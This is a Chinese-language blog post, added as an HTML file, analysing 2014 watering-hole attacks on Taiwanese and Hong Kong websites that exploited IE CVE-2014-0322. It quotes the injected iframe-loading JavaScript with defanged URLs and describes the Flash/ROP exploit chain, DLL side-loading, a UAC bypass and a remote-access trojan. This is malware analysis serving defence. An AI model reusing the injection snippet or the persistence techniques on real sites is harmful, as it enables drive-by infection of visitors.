@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>技术分析：近期港台网站出现的IE“雪人漏洞”挂马攻击</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>技术分析：近期港台网站出现的IE“雪人漏洞”挂马攻击</h2>
+	<p class="meta">2014-03-05</p>
+
+	<div class="post">
+	        <p></p>
+<p style="text-align: center;"><strong><img src="/imgs/5062f232de149621f51fe374b777216d.jpg!small" title="evilsnowman.jpg" data_ue_data-original="/imgs/5062f232de149621f51fe374b777216d.jpg!small" style="width: 550px; height: 444px;" height="444" border="0" hspace="0" vspace="0" width="550"></strong></p>
+<noscript><img src="/imgs/5062f232de149621f51fe374b777216d.jpg!small" title="evilsnowman.jpg" data_ue_src="/imgs/5062f232de149621f51fe374b777216d.jpg!small" style="width: 550px; height: 444px;" height="444" border="0" hspace="0" vspace="0" width="550"></noscript>
+<p><strong>一.台湾民进党网站被挂马方式</strong><br></p>
+<p>挂马网站www[.]dpp[.]org[.]tw , 即该站点的网站主页。</p>
+<p>被篡改的主页网页中嵌入了一条攻击者的js文件，位置在<span style="color: rgb(0, 176, 80);">hxxp://805[.]mnd[.]gov[.]tw/code_upload/NewsInfo/test.js</span></p>
+<p>如下图：</p>
+<p style="text-align: center"> <img data-original="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="01.jpg"></p>
+<noscript><img src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="01.jpg"></noscript>
+<p>test.js会根据当前浏览器的UserAgent识别是否是IE10浏览器以及是否Windows7操作系统，是64位操作系统还是32位操作系统。</p>
+<p>如果是IE10+Windows7系统，那么会根据操作系统位数不同，分别在当前网页中嵌入一个iframe页面</p>
+<p>32位：hxxp://805[.]mnd[.]gov[.]tw/code_upload/NewsInfo/32/ie.html</p>
+<p>64位：hxxp://805[.]mnd[.]gov[.]tw/code_upload/NewsInfo/64/ie.html</p>
+<p style="text-align: center"> <img data-original="/imgs/d564636ac59dd5348c68d569abb45eb8.png!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="02.png"></p>
+<noscript><img src="/imgs/d564636ac59dd5348c68d569abb45eb8.png!small" title="02.png"></noscript>
+<p>ie.html是最终的攻击页面</p>
+<p><br></p>
+<p><strong>二.香港讨论区被挂马方式</strong></p>
+<p>香港讨论区被挂马位置是在网站上的一个javascript文件，位置在：</p>
+<pre class="prettyprint lang-html">hxxp://www[.]discuss[.]com[.]hk/include/javascript/menu.js?v=20140124
+从第226行开始，被篡改加入了如下代码：
+var isIE10 = /MSIE\s+10.0/i.test(navigator.userAgent) &amp;&amp; (function() {"use strict";return this === undefined;}());
+if(isIE10) {
+document.write("&lt;iframe src=&amp;#039;hxxp://www[.]discuss[.]com[.]hk/attachments/day_111007/index.htm&amp;#039; width=0 height=0 hidden&gt;&lt;/iframe&gt;");
+}</pre>
+<p>这个javascript文件是用于处理论坛菜单的脚本，因此论坛首页、版块帖子列表、帖子内容页都会加载这个脚本，无论是仅打开香港讨论区，还是通过帖子列表或搜索引擎等方式进入帖子香港讨论区上任意一个帖子浏览，都会被攻击。</p>
+<p>这个篡改的代码简单通过User Agent判断用户是否使用了IE10浏览器，如果是，则嵌入：</p>
+<pre class="prettyprint lang-html">hxxp://www[.]discuss[.]com[.]hk/attachments/day_111007/index.htm</pre>
+<p>这个页面，这个页面会嵌入下面2个页面：</p>
+<pre class="prettyprint lang-html">hxxp://www[.]discuss[.]com[.]hk/attachments/day_111007/32/ie.html
+hxxp://www[.]discuss[.]com[.]hk/attachments/day_111007/64/ie.html</pre>
+<p>分别是用在32位和64位上的攻击页面，同台湾民进党网站主页挂马的类似。</p>
+<p>同时，还会加载如下javascript文件，hxxp://count31[.]51yes[.]com/click.aspx?id=313452889&amp;logo=1，该文件是用于记录来访者信息的统计脚本。</p>
+<p><strong>三.IE“雪人漏洞”攻击手法</strong></p>
+<p>ie.html中包含了触发CVE-2014-0322漏洞（最早由FireEye曝光在美国军方网站被利用挂马的IE雪人漏洞）的代码，函数名称为puIHa3，接着ie.html会加载一个flash文件Tope.swf</p>
+<p style="text-align: center"> <img data-original="/imgs/ef08e9f65bbefd07d528faddf179add0.png!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="03.png"></p>
+<noscript><img src="/imgs/ef08e9f65bbefd07d528faddf179add0.png!small" title="03.png"></noscript>
+<p>Tope.swf会调用puIHa3中的代码，触发CVE-2014-0322这个IE9/IE10的Use-Afer-Free漏洞，使IE接口使用一块被释放的内存，并由此获得对IE内存任意地址加1的能力，接着通过这个能力修改FLASH的一个vector，将其length设置为非常大的值，使得最终flash代码获得整个IE内存空间的任意读写能力。</p>
+<p style="text-align: center"> <img data-original="/imgs/efd381c316ee52a28f67a452ef25a7ef.png!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="08.png"></p>
+<noscript><img src="/imgs/efd381c316ee52a28f67a452ef25a7ef.png!small" title="08.png"></noscript>
+<p>通过这个能力，flash代码搜索系统内存中关键函数的地址，构造ROP，绕过了IE中的ASLR和DEP安全机制，运行恶意代码。</p>
+<p>Tope.swf在运行恶意代码前，会从同目录网址下载Erido.jpg文件，对于台湾民进党这个挂马，是在：</p>
+<p>hxxp://805[.]mnd[.]gov[.]tw/code_upload/NewsInfo/32/Erido.jpg这个地方。</p>
+<p>这个文件的开头部分是一个PNG格式的文件，但后面部分则是加密后的恶意文件，恶意代码运行后，会解密附加在jpg文件后面的恶意数据，并将恶意程序（一个是DLL文件，下载为sqlrenew.txt，一个是exe文件，下载为stream.exe文件）释放出来。</p>
+<p>接着，flash中已经运行的恶意代码会加载sqlrenew.txt这个DLL文件，该DLL文件检查stream.exe存在后，以隐藏窗口此程序运行起来。</p>
+<p><strong>四.恶意程序攻击手法</strong></p>
+<p>Stream.exe运行后，会向%temp%目录释放以下文件：</p>
+<pre class="prettyprint lang-html">Xlmin.exe
+Enlpu.dll
+Winmgr.dat
+Vmhost.exe
+Ewwt.001</pre>
+<p>其中enlpu.dll 和ewwt.001被膨胀到25MB左右，用于躲过安全软件的分析和上传，接着stream.exe启动xlmin.exe，然后自我删除。（此恶意程序攻击手法与传说中的plugX有相似之处）</p>
+<p>这个xlmin.exe实际是具有联想数字签名的联想笔记本 AutoScroll控制软件，它会加载同目录下的enlpu.dll，攻击者利用这点来让正常的程序加载恶意的enlpu.dll，绕过一些国外安全软件的识别。</p>
+<p>360主动防御可以拦截这种利用方式。</p>
+<p style="text-align: center"> <img data-original="/imgs/8cd4cf384423cdcf2ca37f703c3547e7.png!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="04.png"></p>
+<noscript><img src="/imgs/8cd4cf384423cdcf2ca37f703c3547e7.png!small" title="04.png"></noscript>
+<p>Enlpu.dll加载后，首先通过检查360safe.exe和zhudongfangyu.exe两个进程是否存在来检查用户是否安装了360杀毒或360安全卫士，然后根据是否安装360，以及操作系统版本的情况，尝试不同的攻击方式，试图驻留系统。</p>
+<p style="text-align: center"> <img data-original="/imgs/f73a8b59233846fa846bb32c47b4535e.png!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="05.png"></p>
+<noscript><img src="/imgs/f73a8b59233846fa846bb32c47b4535e.png!small" title="05.png"></noscript>
+<p>(1).针对vista及以下的操作系统，由于没有UAC机制，木马直接尝试感染系统打印机spooler服务要使用到的一个spoolss.dll来实现自动启动，木马首先将spooler服务修改为开机自动启动且在遇到故障时自动重启，然后感染c:\windows\system32\spoolss.dll文件，为其添加一个导入函数，调用其释放的恶意程序，这样，系统启动时加载spooler服务，就会加载这个被感染的系统文件，接着启动木马程序。</p>
+<p style="text-align: center"> <img data-original="/imgs/bd6ef32faa5a0d3a11c749506442b20d.png!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="06.png"></p>
+<noscript><img src="/imgs/bd6ef32faa5a0d3a11c749506442b20d.png!small" title="06.png"></noscript>
+<p>(2).针对vista及以上的操作系统，木马首先加载winmgr.dat这个DLL文件，尝试绕过UAC机制，当不存在360时，木马使用的是一种已经公开很久的绕过UAC的方式，该方式可以绕过警报等级为“中”的UAC防护措施。</p>
+<p>木马先注入EXPLORER.EXE，然后利用Explorer调用具备操作系统目录写入能力的接口，将一个劫持DLL cryptbase.dll释放到%systemroot%\sysprep目录，然后启动该目录下的sysprep.exe，由于该exe会优先加载位于自身目录下的cryptbase.dll，而该exe当UAC报警等级为“中”时是不会弹出UAC警报的，因此实现了绕过UAC提示启动高权限的恶意DLL程序。</p>
+<p>之所以只在不存在360时使用该方法，是因为360主防会拦截这种注入行为。</p>
+<p style="text-align: center"> <img data-original="/imgs/faa91e92a92435970bd379e2f698cb5e.png!small" src="/imgs/b082c25a0f820fd7af0e571b966bacab.jpg!small" title="07.png"></p>
+<noscript><img src="/imgs/faa91e92a92435970bd379e2f698cb5e.png!small" title="07.png"></noscript>
+<p>(3).如攻击者提权或感染服务成功，木马会安装一个恶意服务，服务指向vmhost.exe这个恶意程序，该程序为一个远控程序，可以远程监控或控制用户的系统，获取用户隐私信息等。 </p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
